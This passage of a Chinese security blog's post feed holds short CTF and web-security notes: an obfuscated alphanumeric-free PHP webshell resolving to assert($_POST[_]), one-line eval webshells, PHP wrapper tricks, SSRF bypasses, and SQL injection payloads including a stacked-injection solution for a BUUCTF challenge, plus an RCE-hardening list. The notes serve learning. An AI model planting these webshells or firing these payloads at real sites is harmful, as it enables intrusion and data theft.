variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>$<span class="token variable">$____</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ASSERT($_POST[_]);            </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>参考</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪随机数</title>
      <link href="/2021/09/10/php-wei-sui-ji-shu/"/>
      <url>/2021/09/10/php-wei-sui-ji-shu/</url>
      
        <content type="html"><![CDATA[<p>脚本<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_seed</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议总结</title>
      <link href="/2021/09/10/php-wei-xie-yi-zong-jie/"/>
      <url>/2021/09/10/php-wei-xie-yi-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><p>php配置</p><p>allow_url_fopen=On</p><p>allow_url_include=On</p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>可直接获取POST传输的数据</p><p>不用键与值的形式，只写代码即可</p><p>可以用作命令执行，写一句话木马</p><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>常见用法</p><pre class="line-numbers language-php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=文件路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>非php语法文件include失败，直接输出源码内容</li><li>php语法文件include成功，直接执行</li></ul><h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><p>file:// 与php:filter类似，访问本地文件，但是只能传入绝对路径</p><h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><p>查找指定压缩包内的文件</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h2><p>与phar://类似</p><p>注意</p><ol><li>只能传入绝对路径</li><li>要用#分隔压缩包和压缩包里的内容，#用url编码%23</li></ol><h2 id="data"><a href="#data" class="headerlink" title="data"></a>data</h2><p>与input类似</p><p>用法</p><ol><li><p>直接写入代码</p><pre class="line-numbers language-php"><code class="language-php">data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span><span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用base64编码</p><pre class="line-numbers language-php"><code class="language-php">data<span class="token punctuation">:</span>text<span class="token operator">/</span>plain<span class="token punctuation">;</span>base64<span class="token punctuation">,</span>编码后的php代码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：base64编码后的加号和等号要手动进行url编码，否则无法识别</p></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/20180606180044611" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF应用场景</title>
      <link href="/2021/09/10/ssrf-ying-yong-chang-jing/"/>
      <url>/2021/09/10/ssrf-ying-yong-chang-jing/</url>
      
        <content type="html"><![CDATA[<h2 id="SSRF在Python中的利用"><a href="#SSRF在Python中的利用" class="headerlink" title="SSRF在Python中的利用"></a>SSRF在Python中的利用</h2><ul><li>urllib曾爆出CVE-2019-9740、CVE-2019-9947两个漏洞，这两个漏洞都是urllib(urllib2)的CRLF漏洞，只是触发点不一样，其影响范围都在urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through  3.7.3之间，目前大部分服务器的python2版本都在2.7.10以下，python3都在3.6.x，这两个CRLF漏洞的影响力就非常可观了。其实之前还有一个CVE-2016-5699，同样的urllib（urllib2）的CRLF问题，但是由于时间比较早，影响范围没有这两个大</li><li>除开CRLF之外，urllib还有一个鲜有人知的漏洞CVE-2019-9948，该漏洞只影响urllib，范围在Python  2.x到2.7.16，这个版本间的urllib支持local_file/local-file协议，可以读取任意文件，如果file协议被禁止后，不妨试试这个协议来读取文件。</li></ul><h2 id="SSRF在JAVA中的利用"><a href="#SSRF在JAVA中的利用" class="headerlink" title="SSRF在JAVA中的利用"></a>SSRF在JAVA中的利用</h2><h2 id="30x跳转"><a href="#30x跳转" class="headerlink" title="30x跳转"></a>30x跳转</h2><h2 id="URL解析绕过"><a href="#URL解析绕过" class="headerlink" title="URL解析绕过"></a>URL解析绕过</h2><h2 id="DNS-rebinding"><a href="#DNS-rebinding" class="headerlink" title="DNS rebinding"></a>DNS rebinding</h2><blockquote><p>参考</p><p><a href="https://security.tencent.com/index.php/blog/msg/179" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/179</a></p></blockquote><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html" target="_blank" rel="noopener">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a></p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/index.html" target="_blank" rel="noopener">https://websec.readthedocs.io/zh/latest/vuln/index.html</a></p><p><a href="https://www.evi1s.com/archives/140/" target="_blank" rel="noopener">https://www.evi1s.com/archives/140/</a></p><p><a href="https://www.anquanke.com/post/id/226240" target="_blank" rel="noopener">https://www.anquanke.com/post/id/226240</a></p><p><a href="http://www.feidao.site/wordpress/?p=2116" target="_blank" rel="noopener">http://www.feidao.site/wordpress/?p=2116</a></p>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF中FastCGI本地搭建及原理利用</title>
      <link href="/2021/09/10/ssrf-zhong-fastcgi-ben-di-da-jian-ji-yuan-li-li-yong/"/>
      <url>/2021/09/10/ssrf-zhong-fastcgi-ben-di-da-jian-ji-yuan-li-li-yong/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考</p><p><a href="https://bbs.ichunqiu.com/thread-58455-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-58455-1-1.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> FastCGI </category>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> FastCGI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF_Bypass</title>
      <link href="/2021/09/10/ssrf-bypass/"/>
      <url>/2021/09/10/ssrf-bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF-Bypass"><a href="#SSRF-Bypass" class="headerlink" title="SSRF_Bypass"></a>SSRF_Bypass</h1><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>两个函数一个是url_parser根据url解析出它的host,query,path等信息,第二个就是curl的扩展我们知道curl在php里面可以去用来捕获一个页面取回并输出,那么针对url_parser和curl会有一个识别host的误差,我们可以结合这两个识别host的不同.对地址过滤的情况进行一个bypass.</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/104969439.png" alt="img"></p><p>参考<a href="https://zhishihezi.net/box/b826e3c021c5dc367665f743ae5fa14b" target="_blank" rel="noopener">知识盒子</a>SSRF题目之地址绕过</p><h2 id="数字IP"><a href="#数字IP" class="headerlink" title="数字IP"></a>数字IP</h2><p>尝试将ip地址转换为进制的方式进行绕过,127.0.0.1转换为16进制是0x7F000001</p><h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p><a href="https://zhuanlan.zhihu.com/p/89426041" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/89426041</a></p>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2021/09/10/ssrf/"/>
      <url>/2021/09/10/ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF中URL的伪协议"><a href="#SSRF中URL的伪协议" class="headerlink" title="SSRF中URL的伪协议"></a>SSRF中URL的伪协议</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul><li>file://</li><li>dict://</li><li>sftp://</li><li>ldap://</li><li>tftp://</li><li>gopher://</li></ul><blockquote><p>参考</p><p><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115</a></p><p><a href="https://zhuanlan.zhihu.com/p/73736127" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/73736127</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入_Bypass</title>
      <link href="/2021/09/10/sql-zhu-ru-bypass/"/>
      <url>/2021/09/10/sql-zhu-ru-bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入-Bypass"><a href="#SQL注入-Bypass" class="headerlink" title="SQL注入_Bypass"></a>SQL注入_Bypass</h1><h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><p>%a0</p><h2 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h2><p>%00url截断</p><h2 id="函数过滤"><a href="#函数过滤" class="headerlink" title="函数过滤"></a>函数过滤</h2><p>类似a/**/nd绕过</p><h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token number">b</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token number">c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2021/09/10/sql-zhu-ru/"/>
      <url>/2021/09/10/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="group-by重复键冲突"><a href="#group-by重复键冲突" class="headerlink" title="group by重复键冲突"></a>group by重复键冲突</h3><ul><li><p>多种形式payload：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span>x<span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：输出字符长度限制为64个字符</p></li></ul><h3 id="XPATH报错"><a href="#XPATH报错" class="headerlink" title="XPATH报错"></a>XPATH报错</h3><p>在MySQL高于5.1版本中添加了对XML文档进行查询和修改的函数:</p><ul><li><p>extractvalue()</p><pre class="line-numbers language-sql"><code class="language-sql">EXTRACTVALUE <span class="token punctuation">(</span>XML_document<span class="token punctuation">,</span> XPath_string<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>对XML文档进行查询的函数</li><li>语法：extractvalue(目标xml文档，xml路径)</li></ul><pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>updatexml()</p><ul><li>updatexml()函数与extractvalue()类似，是更新xml文档的函数</li><li>语法：updatexml(目标xml文档，xml路径，更新的内容)</li></ul><pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>当这两个函数在执行时,如果出现xml文档路径错误就会产生</p><p>注：输出字符有长度限制，最长32位</p><h3 id="ExtractValue报错"><a href="#ExtractValue报错" class="headerlink" title="ExtractValue报错"></a>ExtractValue报错</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>@<span class="token variable">@version</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注：输出字符有长度限制，最长32位</p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>什么是堆叠注入：使用分号结束上一个语句再叠加其他语句一起执行</p><p><a href="https://zhuanlan.zhihu.com/p/78989602" target="_blank" rel="noopener">参考</a></p><p>例题来自BUUCTF-[强网杯 2019]随便注1</p><ul><li><p>打开后查看源码<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212459552.png" alt="image-20201115212459552"><img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212514056.png" alt="image-20201115212514056"></p></li><li><p>所以就手工注入吧。尝试单引号，发现报错</p><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212619437.png" alt="image-20201115212619437"></p><p>显然是但引号闭合，尝试闭合，发现没问题<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212729519.png" alt="image-20201115212729519"></p></li><li><p>有报错，有回显，那就从<strong>联合注入</strong>开始。发现到order by 3时报错，即有两个字段<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201115212924226.png" alt="image-20201115212924226"></p></li><li><p>select查询发现被过滤<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213016731.png" alt="image-20201115213016731"></p></li><li><p><strong>多行注释</strong>、<strong>大小写</strong>、<strong>双写</strong>均无法绕过，并且由于update被过滤，无法用<strong>updatexml报错</strong>，尝试<strong>ExtractValue报错</strong><img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213531495.png" alt="image-20201115213531495"></p></li><li><p><strong>ExtractValue报错</strong>可行，不过也到此为止。这时考虑<strong>堆叠注入</strong>，发现可行<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201115213647092.png" alt="image-20201115213647092"></p></li><li><p>查出当前可查的表<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201115214021920.png" alt="image-20201115214021920"></p></li><li><p>用desc查看表结构的详细信息<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201115214113905.png" alt="image-20201115214113905"></p><p>此处查询表名为数字、关键字时，使用反引号将其包裹，否则会出现错误<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201115215139041.png" alt="image-20201115215139041"></p></li><li><p>我们可以得知flag存在于supersqli数据库中`1919810931114514`表的flag字段。</p></li><li><p>最终payload有两种</p><ul><li><p>预编译相关语法如下：</p><pre class="line-numbers language-text"><code class="language-text">set用于设置变量名和值prepare用于预备一个语句，并赋予名称，以后可以引用该语句execute执行语句deallocate prepare用来释放掉预处理的语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">';set @sql = CONCAT('</span>se<span class="token string">','</span>lect <span class="token operator">*</span> <span class="token keyword">from</span>   <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span><span class="token punctuation">;</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>prepare stmt <span class="token keyword">from</span> <span class="token variable">@sql</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> stmt<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span>拆分开来如下<span class="token operator">-</span><span class="token number">1</span><span class="token string">';set @sql = CONCAT('</span>se<span class="token string">','</span>lect <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span><span class="token punctuation">;</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>prepare stmt <span class="token keyword">from</span> <span class="token variable">@sql</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> stmt<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为：<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201115220307215.png" alt="image-20201115220307215"></p><p>这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。</p><pre class="line-numbers language-mysql"><code class="language-mysql">-1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#拆分开来如下：-1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为：<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201115220501035.png" alt="image-20201115220501035"></p></li><li><p><strong>更改表名列名</strong></p><p>修改表名和列名的语法如下：</p><pre class="line-numbers language-text"><code class="language-text">修改表名(将表名user改为users)alter table user rename to users;修改列名(将字段名username改为name)alter table users change uesrname name varchar(30);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终payload如下：</p><pre class="line-numbers language-mysql"><code class="language-mysql">1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#拆分开来如下1';alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用<code>1' or 1=1#</code>即可查询出flag</p></li></ul></li></ul><h2 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h2><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h3><h3 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h3><h3 id="heavy-query"><a href="#heavy-query" class="headerlink" title="heavy query"></a>heavy query</h3><p>heavy query顾名思义就是通过做大量的查询导致查询时间较长来达到延时的目的。</p><ul><li><p>笛卡尔积</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> A<span class="token punctuation">,</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> B<span class="token punctuation">,</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> C<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>get_lock</p><p>延时精确可控，利用环境有限，需要开两个session测试。</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> get_lock<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> get_lock<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>rlike</p><p>通过<code>rpad</code>或<code>repeat</code>构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> rpad<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">4999999</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">RLIKE</span> concat<span class="token punctuation">(</span>repeat<span class="token punctuation">(</span><span class="token string">'(a.*)+'</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE防护</title>
      <link href="/2021/09/10/rce-fang-hu/"/>
      <url>/2021/09/10/rce-fang-hu/</url>
      
        <content type="html"><![CDATA[<p>代码注入的防治：</p><ol><li>升级到PHP7.1，该版本对大部分常见的执行动态代码的函数进行了封堵。</li><li>php.ini中，关闭<code>allow_url_fopen</code>。在打开它的情况下，可以通过<code>phar://</code>等协议丢给<code>include</code>，让其执行动态代码。</li><li>php.ini中，通过<code>disable_functions</code>关闭<code>exec</code>,<code>passthru</code>,<code>shell_exec</code>,<code>system</code>等函数，禁止PHP调用外部程序。</li><li>永远不要在代码中使用<code>eval</code>。</li><li>设置好上传文件夹的权限，禁止从该文件夹执行代码。</li><li>include文件的时候，注意文件的来源；需要动态include时做好参数过滤。</li><li>对于<code>preg_replace()</code>函数，要放弃使用/e修饰符，也可以使用<code>preg_replace_callback()</code>函数代替。如果一定要使用该函数，请保证第二个参数中，对于正则匹配出的对象用单引号包裹，因为<code>mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit]) /e</code>修正符使preg_replace()将replacement参数当作PHP代码（在适当的逆向引用替换完之后）。</li></ol>]]></content>
      
      
      <categories>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE常见函数</title>
      <link href="/2021/09/10/rce-chang-jian-han-shu/"/>
      <url>/2021/09/10/rce-chang-jian-han-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="php代码-命令执行漏洞常见危险函数"><a href="#php代码-命令执行漏洞常见危险函数" class="headerlink" title="php代码/命令执行漏洞常见危险函数"></a>php代码/命令执行漏洞常见危险函数</h1><h3 id="php代码执行相关"><a href="#php代码执行相关" class="headerlink" title="php代码执行相关"></a>php代码执行相关</h3><blockquote><p>参考<a href="https://www.php.net/manual/zh/index.php" target="_blank" rel="noopener">php手册</a></p></blockquote><ul><li><p>eval()</p><ul><li><p>说明</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span>string <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">:</span>mixed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>将字符串<code>$code</code>作为php代码执行。常见的一句话木马：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>所有的语句必须以分号结尾</p></li><li><p>可以用合适的PHP 